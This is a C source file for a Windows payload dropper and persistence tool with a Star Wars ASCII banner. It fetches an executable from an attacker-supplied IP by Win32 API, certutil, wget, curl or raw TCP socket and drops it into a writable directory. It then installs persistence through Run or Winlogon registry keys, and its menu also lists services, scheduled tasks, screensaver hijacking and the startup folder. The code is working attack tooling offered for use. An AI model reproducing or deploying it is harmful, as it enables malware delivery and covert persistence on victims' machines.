#include <winsock2.h>
#include <stdlib.h>
#include <ctype.h>
#include <urlmon.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdarg.h>
#include "download.h"
#include "helper.h"
#include "pers.h"

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

VOID _ListOpts(const char *str, ...);
#define ListOpts(...) _ListOpts(__VA_ARGS__, NULL)

typedef struct _WRITABLE_DIR {
    char path[MAX_PATH + 1];
} WRITABLE_DIR, *PWRITABLE_DIR;

VOID _ListOpts(const char *str, ...) {
    int o=0;
    va_list arg;
    va_start(arg, str);
    for (int i=0;i<20;i++) printf("%c", '-');
    printf("\n\n");
    while (str) {
        printf("[%d]: %s\n", ++o, str);
        str = va_arg(arg, const char *);
    }
    printf("[h]: List options again\n");
    printf("[q]: Quit program\n\n");

    for (int i=0;i<20;i++) printf("%c", '-');
    printf("\n\n");

    va_end(arg);
}

BOOL AddWritableDir(WRITABLE_DIR **array, int *count, int *capacity, const char *path, int pathLen) {
    if (*count >= *capacity) {
        *capacity = (*capacity == 0) ? 16 : (*capacity * 2);
        *array = realloc(*array, (*capacity) * sizeof(WRITABLE_DIR));
        if (!*array) {
            printf("[-] Allocation failed");
            return FALSE;
        }
    }
    
    strncpy((*array)[*count].path, path, pathLen);
    (*array)[*count].path[pathLen] = '\0';
    (*count)++;

    return TRUE;
}

BOOL FileExists(const char *path) {
	DWORD attrib = GetFileAttributesA(path);
	return (attrib != INVALID_FILE_ATTRIBUTES && !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}
    
BOOL IsExecutable(const char *path) {
	DWORD binaryType;
	LSTATUS stat = GetBinaryTypeA((LPCSTR)path, (LPDWORD)&binaryType);
	char *errMsg;
	DWORD errCode;
	if (stat == ERROR) {
		errCode = GetLastError();
		TranslateError(errCode, &errMsg);
		printf("[-] Error: %s\n", errMsg);
		LocalFree(errMsg);
		return FALSE;
	}

	return TRUE;
}

BOOL IsResourceValid(const char *source) {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", 
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0
    );
    if (!hInternet) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }
    // Decrease the timeout
    DWORD timeout = 2000;
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hUrl = InternetOpenUrlA(hInternet, source, NULL, 0, INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        TranslateErrorPrintStr("Failed to create an URL object. Check whether the given url:port is valid");
        return FALSE;
    }
    
    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (!HttpQueryInfoA(hUrl, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &statusCode, &size, NULL)) {
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hUrl);
        TranslateErrorPrintStr("HTTP Query failed");
        return FALSE;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (statusCode >= 200 && statusCode < 400) {
        return TRUE;
    } else {
        printf("[!] Resource is not available. Status code: %d\n", statusCode);
        printf("[?] To start a webserver for hosting your payload, run the following command inside the directory of your binary\n\t$ python3 -m http.server\n");
        return FALSE;
    }
}

int HandleDownload(char* opt, void *data) {
    if (printHelp || opt == NULL) {
        ListOpts(
            "Download using Win32 API", 
            "Download using certutil.exe", 
            "Download using wget", 
            "Download using curl",
            "Download using raw TCP sockets"  
        );
        printHelp = FALSE;
        return CONTINUE_ERROR;
    }

    PDOWNLOAD_CONTEXT pDownloadContext = (PDOWNLOAD_CONTEXT) data;
    
    switch ((char) *opt) {
        case '0':
           break; 
        case '1':
            if (!DownloadUsingWin32(pDownloadContext)) {
                return CONTINUE_ERROR;
            }
            return SUCCESS;
        case '2':
            if (!DownloadUsingCertutil(pDownloadContext)) {
                return CONTINUE_ERROR;
            }
            return SUCCESS;
        case '3':
            if (!DownloadUsingWget(pDownloadContext)) {
                return CONTINUE_ERROR;
            }
            return SUCCESS;
        case '4':
            if (!DownloadUsingCurl(pDownloadContext)) {
                return CONTINUE_ERROR;
            }
            return SUCCESS;
        case '5':
            break;
        default:
            printf("[?] Unknown option specified. Select <h> for available options\n");
            return CONTINUE_ERROR;
    }
}

int HandlePersistence(char *opt, void *data) {
    if (printHelp || opt == NULL) {
        ListOpts(
            "Registry run key",
            "Registry winlogon key",
            "Create a startup service",
            "Create a scheduled task",
            "Hijack screensaver",
            "Add payload to the startup folder"
        );
        printHelp = FALSE;
        return CONTINUE_ERROR;
    }

    PPERS_CONTEXT pPersContext = (PPERS_CONTEXT) data;

    switch((char) *opt) {
        case '1':
            if (!InjectRunRegistry(pPersContext)) {
                return CONTINUE_ERROR;
            }
            return SUCCESS;
        case '2':
            if (!InjectWinlogonRegistry(pPersContext)) {
                return CONTINUE_ERROR;
            }
            return SUCCESS;
        default:
            printf("[?] Unknown option specified. Select <h> for available options\n");
            return CONTINUE_ERROR;
    }
}

int HasWriteAccess(char *dirPath, void *data) {
    (void) data;

    char testPath[MAX_PATH + 1];
    if (dirPath[strlen(dirPath) - 1] != '\\') {
        dirPath[strlen(dirPath)] = '\\';
    }
    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
    
    wchar_t wTestPath[MAX_PATH + 1];
    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);


    HANDLE hFile = CreateFileW(
        wTestPath,
        FILE_WRITE_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return WIN_ERROR;
    }

    CloseHandle(hFile);
    return SUCCESS;
}
 
BOOL ParseInput(int argc, char *argv[], char *ip, int *ipLen, char *exe, int *exeLen, char *target, int *targetLen, int *port, BOOL *socketReceive) {
	int opt;
	int iFlag = 0, eFlag = 0, tFlag = 0;
	*port = 80;
	while ((opt = getopt(argc, argv, "i:e:t:p:s")) != -1) {
		switch (opt) {
			case 'i':
				*ipLen = strlen(optarg);
				memcpy(ip, optarg, *ipLen);
				ip[*ipLen] = '\0';
                iFlag = 1;
				break;
			case 'e':
				*exeLen = strlen(optarg);
				memcpy(exe, optarg, *exeLen);
				exe[*exeLen] = '\0';
				eFlag = 1;
				break;
            case 't':
                *targetLen = strlen(optarg);
                memcpy(target, optarg, *targetLen);
                target[*targetLen] = '\0';
                tFlag = 1;
                break;
			case 'p':
				BOOL valid = TRUE;
				for (int i = 0; optarg[i]; i++) {
					if (!isdigit((unsigned char)optarg[i])) {
						valid = FALSE;
						break;
					}
				}
				if (valid) {
					*port = atoi(optarg);
				} else {
					printf("[-] Invalid port specified\n");
					return FALSE;
				}
                break;
            case 's':
                *socketReceive = TRUE;
            break;
			default:
				return FALSE;
				break;
		}
	}
	if (!iFlag || !eFlag) {
		return FALSE;
	}
    if (!tFlag) {
        *targetLen = *exeLen;
        strncpy(target, exe, (*exeLen) + 1);
    }
	return TRUE;
}

int main(int argc, char* argv[]) {
	char payloadFull[MAX_PATH]; // How it will be saved inside the machine
	int payloadFullLen;
	char exe[MAX_FILE + 1];
    char ip[256];
    char target[MAX_FILE + 1];
    int ipLen;
	int exeLen;
    int targetLen; 
    int port; 
    char source[MAX_URL + 1];
    char targetDirTmp[MAX_PATH + 1];
    char opt[16];
    BOOL receiveUsingSocket;

    char *errMsg;
    DWORD errCode;

    WRITABLE_DIR *wdirs = NULL;
    int capacity = 16, count = 0;
   
printf("     .    .     .            +         .         .                 .  .\n      .                 .                   .               .\n              .    ,,o         .                  __.o+.\n    .            od8^                  .      oo888888P^b           .\n       .       ,\".o'      .     .             `b^'\"\"`b -`b   .\n             ,'.'o'             .   .          t. = -`b -`t.    .\n            ; d o' .        ___          _.--.. 8  -  `b  =`b\n        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .\n    .     |^88^88=. .,x88/::/ | \\\\`;;;;;;d%%%%%88%88888/%x88888\n          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\\%%%%\\8888\n      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .\n          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .\n          Yx88o88^^'\"`^^%8boooood..-\\H_Hd%P%%88%P^%%^'\\;;;/%%88\n         . `\"\\^\\          ~\"\"\"\"\"'      d%P \"\"\"^\" ;   = `+' - P\n   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .\n              .`.b     .        .    `788      ,'-  = d' =.'\n       .       ``.b.                           :..-  :'  P\n            .   `q.>b         .               `^^^:::::,'       .\n    LS            \"\"^^               .                     .\n  .                                           .               .       .\n    .         .          .                 .        +         .\n                    Sienar Fleet Systems' TIE Bomber\n                         Light Space Bomber (2)\n                         Code by viv4ldi\n                         Art by ascii.co.uk\n\n\n");



    if (ParseInput(argc, argv, ip, &ipLen, exe, &exeLen, target, &targetLen, &port, &receiveUsingSocket) == FALSE) {
        printf("[!] Usage: %s -i <IP> -e <EXE> [-t <TARGET NAME>] [-p <PORT>] [-s (use raw TCP sockets)]\n", argv[0]);
		exit(1);
	}
    
    if (!receiveUsingSocket) {
      	snprintf(source, MAX_URL, "http://%s:%d/%s", ip, port, exe);
    	printf("[*] Source to extract payload from: %s\n", source);
        printf("[*] Checking whether resource is accessible\n");
        if (!IsResourceValid(source)) {
            if (!PromptUntilValid("Continue[y/n]", opt, sizeof(opt), NULL, NULL, FALSE)) {
                exit(1);
            }
        }
    } else {
        printf("[*] Will be received using TCP socket. Host: %s:%d\n", ip, port);
    }
    //DOWNLOAD_CONTEXT downloadContext;
    //goto test;
    if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL, FALSE)) {
        exit(1); 
    }
    
    char targetDir[MAX_PATH + 1];
    int targetDirLen = GetFullPathNameA(targetDirTmp, MAX_PATH, targetDir, NULL);
    if (!targetDirLen) {
        TranslateErrorPrint(GetLastError());
        exit(1);
    }

    memcpy(payloadFull, targetDir, targetDirLen);
    memcpy(payloadFull + targetDirLen, target, targetLen);
    payloadFull[targetDirLen + targetLen] = '\0';
    payloadFullLen = strlen(payloadFull);

    printf("[*] Payload will be dropped as %s\n", payloadFull);
 
    // Check if file exists
    if (FileExists(payloadFull)) {
        if (!PromptUntilValid("Overwrite[y/n]", opt, sizeof(opt), NULL, NULL, FALSE)) {
            exit(1);
        }
    }

    DOWNLOAD_CONTEXT downloadContext = {
        .ip = ip,
        .ipLen = ipLen,
        .port = port,
        .targetPath = payloadFull,
        .targetPathLen = payloadFullLen
    };

    if (!receiveUsingSocket) {
        printf("\n\n[*] **DOWNLOAD OPTIONS**\n\n");
        downloadContext.sourceUrl = source;
        downloadContext.sourceUrlLen = strlen(source);
        HandleDownload(NULL, NULL);
        if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext, FALSE)) {
            exit(1);
        }
    } else {
        if (!DownloadUsingTCPSocket((PDOWNLOAD_CONTEXT) &downloadContext)) {
            exit(1);
        }
    }
test:
    printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n");    
    PERS_CONTEXT persContext = {
        .regKey = NULL,
        .valueName = NULL,
        .valueData = NULL,
        .valueDataLen = NULL,
        .valueType = 0,
        .targetPath = payloadFull,
        .targetPathLen = payloadFullLen
    };

    HandlePersistence(NULL, NULL);
    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandlePersistence, (PPERS_CONTEXT) &persContext, FALSE)) {
        exit(1);
    }

	return 0;
}
